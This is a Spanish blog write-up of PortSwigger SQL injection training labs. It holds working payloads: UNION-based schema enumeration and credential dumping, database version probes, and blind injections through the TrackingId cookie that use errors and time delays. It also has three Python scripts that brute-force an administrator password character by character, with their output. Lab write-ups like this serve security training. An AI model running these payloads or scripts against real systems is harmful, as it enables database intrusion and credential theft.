---
layout: post
title: SQLi PortSwigger
date: 2023-04-23
description:
#cover_id: #img/articulos/sqli-portswigger/sqli-portswigger.png # Add image post (optional)
fig-caption:
tags: []
---
___

<center><img src="/img/articulos/sqli-portswigger/sqli-portswigger.png" alt=""></center>

Consiste en una serie de laboratorios, todos ellos relacionados con las inyecciones SQL. El objetivo final no es ganar accesso al sistema, si no obtener una flag para resolverlos. Una vez iniciado, se creará un subdominio propio, a través del cual se procede a la enumeración

# LAB1

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/1.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/2.png" alt="">

* **Explotación** 

El parámetro ```Category``` es vulnerable. El número total de columnas es 8. En caso de aplicar un ordenamiento con otro número, el servidor devuelve un código de estado 500

```null
GET /filter?category=Clothing'+order+by+8--+- HTTP/2
Host: 0a05008e0409104a817934ca004d002f.web-security-academy.net
Cookie: session=i1BdpziL0QTw3Hwbn7WoLJPacZHPibM5
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

<img src="/img/articulos/sqli-portswigger/3.png" alt="">

En este caso no hay que dumpear ningún dato, si no aplicar una condición booleana verdadera con la sentencia ```' or 1=1-- -```

<img src="/img/articulos/sqli-portswigger/4.png" alt="">

# LAB2

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/5.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/6.png" alt="">

* **Explotación**

Puedo ver un panel de inicio de sesión

<img src="/img/articulos/sqli-portswigger/7.png" alt="">

En este caso la query a introducir sería ```admin' or 1=1-- -```, ya que para que se aplique la validación correctamente tiene que haber datos encapsulados en las comillas simples. A modo de ejemplo, el servidor estaría ejecutando algo como:

```null
select name,last_name from users where username = '%s' and password = '%s'
```

<img src="/img/articulos/sqli-portswigger/8.png" alt="">

# LAB3

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/9.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/10.png" alt="">

* **Explotación**

En este caso, el número total de columnas es 3

```null
GET /filter?category=Pets'+order+by+3--+-
```

<img src="/img/articulos/sqli-portswigger/11.png" alt="">

Selecciono todas

```null
GET /filter?category=Pets'+union+select+NULL,NULL,NULL--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/12.png" alt="">

Con esto bastaría para resolver el laboratorio

<img src="/img/articulos/sqli-portswigger/13.png" alt="">

# LAB4

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/14.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/15.png" alt="">

* **Explotación**

Vuelve a tener 3 columnas

```null
GET /filter?category=Accessories'+order+by+3--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/16.png" alt="">

Para que devuelva la cadena que se solicita, se puede introducir dentro de comillas simples en la selección de las columnas. Es importante saber que no siempre todos los campos son inyectables

```null
GET /filter?category=Accessories'+union+select+NULL,'Q1CbEn',NULL--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/17.png" alt="">

<img src="/img/articulos/sqli-portswigger/18.png" alt="">

# LAB5

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/19.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/20.png" alt="">

* **Explotación**

En este caso, el número total de columnas son dos

```null
GET /filter?category=Lifestyle'+order+by+2--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/21.png" alt="">

Listo las bases de datos existentes

```null
GET /filter?category=Lifestyle'+union+select+table_name,NULL+from+information_schema.tables+where+table_schema%3d'public'--+- HTTP/2
```

En la respuesta se muestra el output

<img src="/img/articulos/sqli-portswigger/22.png" alt="">

Para esta tabla, listo las columnas

```null
GET /filter?category=Lifestyle'+union+select+column_name,NULL+from+information_schema.columns+where+table_schema%3d'public'+and+table_name%3d'users'--+-
```

De todas las que reporta, me quedo con los usuarios y contraseñas

<img src="/img/articulos/sqli-portswigger/23.png" alt="">

Dumpeo las credenciales para todos los usuarios

```null
GET /filter?category=Lifestyle'+union+select+username,password+from+public.users--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/24.png" alt="">

Inicio sesión y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/25.png" alt="">

# LAB6

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/26.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/27.png" alt="">

* **Explotación**

Es el mismo caso que el anterior, solo que esta vez en el mismo campo tienen que estar concatenados usuario y contraseña. Vuelvo a listar las bases de datos

```null
GET /filter?category=Gifts'+union+select+NULL,schema_name+from+information_schema.schemata--+- HTTP/2
```

Y las tablas

```null
GET /filter?category=Gifts'+union+select+NULL,table_name+from+information_schema.tables+where+table_schema%3d'public'--+- HTTP/2
```

Con las columnas para ```users```

```null
GET /filter?category=Gifts'+union+select+NULL,column_name+from+information_schema.columns+where+table_schema%3d'public'+and+table_name='users'--+- HTTP/2
```

Dumpeo los valores

```null
GET /filter?category=Gifts'+union+select+NULL,username||':'||password+from+public.users--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/28.png" alt="">

Me loggeo y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/29.png" alt="">

# LAB7

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/30.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/31.png" alt="">

* **Explotación**

En este caso, se está empleando Oracle. Es necesario indicar en todo momento una tabla. La más común en la enumeración es ```dual``.

```null
GET /filter?category=Gifts'+union+select+NULL,NULL+from+dual--+- HTTP/2
```

Extraigo la versión. Para ello, es necesario conocer un campo en el que incluir la tabla que la contiene

```null
GET /filter?category=Gifts'+union+select+NULL,banner+from+v$version--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/32.png" alt="">

# LAB8

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/33.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/34.png" alt="">

* **Explotación**

Ahora hay que hacer lo mismo pero para MySQL y Microsoft

```null
GET /filter?category=Gifts'+union+select+NULL,@@version--+- HTTP/2
```

<img src="/img/articulos/sqli-portswigger/35.png" alt="">

# LAB9

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/36.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/37.png" alt="">

* **Explotación**

Enumero las bases de datos

```null
GET /filter?category=Gifts'+union+select+NULL,schema_name+from+information_schema.schemata--+- HTTP/2
```

Las tablas para ```public```

```null
GET /filter?category=Gifts'+union+select+NULL,table_name+from+information_schema.tables+where+table_schema%3d'public'--+- HTTP/2
```

Y las columnas de ```users_uixwzd```

```null
GET /filter?category=Gifts'+union+select+NULL,column_name+from+information_schema.columns+where+table_schema%3d'public'+and+table_name='users_uixwzd'--+- HTTP/2
```

Me quedo con usuario y contraseña. En este caso, los nombres son algo extraños, ```username_zkdsyz```, ```password_ihdhjk```

```null
GET /filter?category=Gifts'+union+select+NULL,username_zkdsyz||':'||password_ihdhjk+from+public.users_uixwzd--+- HTTP/2
```

Inicio sesión y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/38.png" alt="">

## LAB10

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/39.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/40.png" alt="">

* **Explotación**

Mismo lab que el anterior, pero se está empleando Oracle por detrás. Selecciono las dos columnas

```null
GET /filter?category=Gifts'+union+select+NULL,NULL+from+dual--+- HTTP/2
```

Listo todas las tablas de todas las bases de datos

```null
GET /filter?category=Gifts'+union+select+NULL,table_name+from+all_tables--+- HTTP/2
```

Para evitar ruido, también se puede filtrar por un propietario

```null
GET /filter?category=Gifts'+union+select+NULL,owner+from+all_tables--+- HTTP/2
```

```null
GET /filter?category=Gifts'+union+select+NULL,table_name+from+all_tables+where+owner='PETER'--+- HTTP/2
```

Enumero las columnas para los usuarios

```null
GET /filter?category=Gifts'+union+select+NULL,column_name+from+all_tab_columns+where+table_name='USERS_KQEEJZ'--+- HTTP/2
```

Dumpeo las credenciales

```null
GET /filter?category=Gifts'+union+select+NULL,USERNAME_BIOVYO||':'||PASSWORD_DLXEUE+from+USERS_KQEEJZ--+- HTTP/2
```

Me loggeo y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/41.png" alt="">

# LAB11

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/42.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/43.png" alt="">

* **Explotación**

En este caso, el campo vulnerable es la cookie de sesión ```TrackingId```. Al introducir una comilla simple, el mensaje de bienvenida que se podía ver al inicio desaparece

<img src="/img/articulos/sqli-portswigger/44.png" alt="">

Puedo tratar de insertar una nested query que se encargue de seleccionar un caracter de una columna, fijando la posición. Dejo abierta una comilla porque se va a cerrar en la query que se aplica por detrás, en caso contrario, tendría que añadir un comentario para que no se produzca un error

```null
Cookie: TrackingId=CzzySOcML6e4oFIh' and (select substring(password 1,1) from users where username='administrator')='a;
```

Creo un script en python que se encargue de aplicar la fuerza bruta

```null
#!/usr/bin/python3
from pwn import *
import requests, string, signal, sys, pdb

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

characters = string.ascii_lowercase + string.digits
main_url = "https://0a1600f9048c8f1a828e394a001300bf.web-security-academy.net/"

def MakeRequest():

    password = ""
    p1 = log.progress("Blind SQLi:")
    p2 = log.progress("Password:")

    for position in range(1, 21):

        for character in characters:

            cookies = {
                'TrackingId': "MvIdBgEfhEtivOSb' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                'session': 'tO7WFRZa7lYpzv9dCahLIysRNfM3PCjb'
            }

            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break



if __name__ == '__main__':
    MakeRequest()
```

```null
python3 /home/rubbx/Desktop/sqli_lab12.py
[▗] Blind SQLi:: MvIdBgEfhEtivOSb' and (select substring(password,20,1) from users where username='administrator')='9
[▗] Password:: gp6y8b36tslzei88mx99
```

Me loggeo y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/45.png" alt="">

# LAB12

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/46.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/47.png" alt="">

* **Explotación**

Ahora cuando la respuesta es inválida devuelve un código de estado 500. La solución para esta ocasión es introducir otra comilla simple, ya que lo más probale es que se quedara un campo sin cerrar. Además, se está empleando Oracle, por lo que hay que indicar una tabla

```null
Cookie: TrackingId=NEQKfeMP7dS3xYpf'||(select '' from dual)||'; session=PmZjpcdziBGJBIQia08cMoUTkkAvosvU
```

La inyección consiste en un bucle infinito que va a iterar por cada caracter y en caso de que la condición se cumpla, se efectuará la operatoria ```1/0```, lo que originará un error (500), por lo que puedo descartarlos y dumpear los datos que quiera basándome en esta condición. Por ejemplo, así se podría obtener la longitud de la contraseña

```null
Cookie: TrackingId=NEQKfeMP7dS3xYpf'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)=20)||'
```

El código de estado será 500 solo para el valor ```20```

<img src="/img/articulos/sqli-portswigger/48.png" alt="">

Creo un nuevo script en python que dumpee la contraseña

```nulll
#!/usr/bin/python3
from pwn import *
import requests, string, signal, time, sys, pdb

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

characters = string.ascii_lowercase + string.digits
main_url = "https://0a58004903162da580414ea100fe00cd.web-security-academy.net/"

def MakeRequest():

    password = ""
    p1 = log.progress("Blind SQLi:")
    p2 = log.progress("Password:")

    for position in range(1, 21):

        for character in characters:

            cookies = {
                'TrackingId': "NEQKfeMP7dS3xYpf'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session': 'PmZjpcdziBGJBIQia08cMoUTkkAvosvU'
            }

            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break



if __name__ == '__main__':
    MakeRequest()
```

```null
python3 /home/rubbx/Desktop/sqli_lab12.py
[◥] Blind SQLi:: NEQKfeMP7dS3xYpf'||(select case when substr(password,20,1)='u' then to_char(1/0) else '' end from users where username='administrator')||'
[b] Password:: 1sog9b6p4vh7260pf08u
```

Me loggeo para terminar el laboratorio

<img src="/img/articulos/sqli-portswigger/49.png" alt="">

# LAB13

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/50.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/51.png" alt="">

* **Explotación**

En este caso se está empleando PostgreSQL. Solo piden que la web tarde 10 segundos en responder

<img src="/img/articulos/sqli-portswigger/52.png" alt="">

```null
Cookie: TrackingId=Usj9qPoVOZv48tQ4'||pg_sleep(10)--+-
```

# LAB14

* **Instrucciones**

<img src="/img/articulos/sqli-portswigger/53.png" alt="">

* **Página Principal**

<img src="/img/articulos/sqli-portswigger/54.png" alt="">

* **Explotación**

Al igual que en el Oracle, puedo crear una condición que se encarge de iterar por cada caracter, pero esta vez a base del tiempo y no del código de estado

```null
Cookie: TrackingId=jCIXibJNL8DfHHYA'||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users where username='administrator')-- -
```

También es válido obtener la longitud de la contraseña con la query anterior. Creo un nuevo script en python para dumpear la contraseña

```null
#!/usr/bin/python3
from pwn import *
import requests, string, signal, time, sys, pdb

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

characters = string.ascii_lowercase + string.digits
main_url = "https://0ab1003603d790f68013943100490077.web-security-academy.net/"

def MakeRequest():

    password = ""
    p1 = log.progress("Blind SQLi:")
    p2 = log.progress("Password:")

    for position in range(1, 21):

        for character in characters:

            time_init = time.time()

            cookies = {
                'TrackingId': "jCIXibJNL8DfHHYA'||(select case when substring(password,%d,1)='%s' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session': 'WH1CuCd9cSPeHKglVlUoKmdzLJ5nH5cW'
            }

            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)

            time_end = time.time()

            if time_end - time_init > 3:
                password += character
                p2.status(password)
                break



if __name__ == '__main__':
    MakeRequest()
```

```null
python3 /home/rubbx/Desktop/sqli_lab12.py
[../.....] Blind SQLi:: jCIXibJNL8DfHHYA'||(select case when substring(password,20,1)='d' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -
[b] Password:: g4gkwyt5fjqjdpeub86d
```

La introduzco y termino el laboratorio

<img src="/img/articulos/sqli-portswigger/55.png" alt="">